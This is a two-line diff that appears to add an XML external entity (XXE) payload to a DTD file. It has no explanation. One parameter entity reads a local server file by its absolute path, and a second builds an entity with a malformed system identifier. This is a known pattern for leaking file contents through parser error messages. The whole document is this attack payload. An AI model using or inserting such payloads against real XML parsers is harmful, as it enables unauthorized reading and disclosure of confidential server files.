@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///opt/browsersoft/node/root/deployments/LACIE_CERT_13_7_9/mpi2configuration/decision_matrix.csv">
+<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
